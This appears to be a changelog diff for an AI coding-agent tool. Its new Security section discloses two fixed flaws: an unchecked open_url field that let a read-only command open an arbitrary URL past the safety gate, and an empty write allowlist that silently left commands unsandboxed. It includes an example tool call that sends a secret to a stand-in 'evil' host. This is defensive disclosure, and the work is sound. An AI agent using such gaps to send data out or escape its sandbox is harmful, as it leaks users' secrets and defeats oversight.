@@ -7,6 +7,30 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+- **`execute_command`'s `open_url` is now policy-gated.** It was never passed
+  to the safety gate: `execute()` built its request from `command` alone, then
+  handed the URL to the OS browser launcher from the *unsandboxed* parent
+  process. So a command that classifies read-only carried an arbitrary URL out
+  of the two modes that exist to prevent that —
+  `{"command": "cat README.md", "mode": "background", "open_url":
+  "https://evil/?d=<secret>"}` opened the attacker's URL in `read_only` and
+  `plan` mode, bypassing `[plan] web = ask` entirely. The URL is now gated as
+  Web egress *before* the process spawns, so a refusal also leaves no detached
+  child behind, and the URL itself reaches the classifier and the approval
+  modal (a dev-server URL and an exfiltrating one are otherwise
+  indistinguishable).
+
+- **An empty write-confinement allowlist no longer runs the command
+  unconfined.** `SandboxPolicy.allowed_writes` was a `Vec`, so "confine writes
+  to nowhere" (a deny-all) and "confinement was never requested" were the same
+  value. `enforce` took its all-off short-circuit for the former and returned
+  `fs_enforced: true` having enforced nothing, while the caller still wrapped
+  the command in `__sandbox-exec` because it had asked for confinement. The
+  field is now `confine_writes: Option<Vec<PathBuf>>` and the launcher protocol
+  carries an explicit `--confine-fs` marker independent of the root list.
+
 ### Fixed
 
 - **A message that opens with a path is no longer swallowed by the command
@@ -37,8 +61,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   where before it drew no palette but still ran the command on Enter, and
   `/help<newline>more` now runs `/help`, where before the palette offered it
   and the parser refused it.
-
-### Changed
 
 - **BREAKING: default safety mode is now `Auto` (was `Ask`).** A fresh
   session — with no `mode` in any config file — starts classifier-vetted:
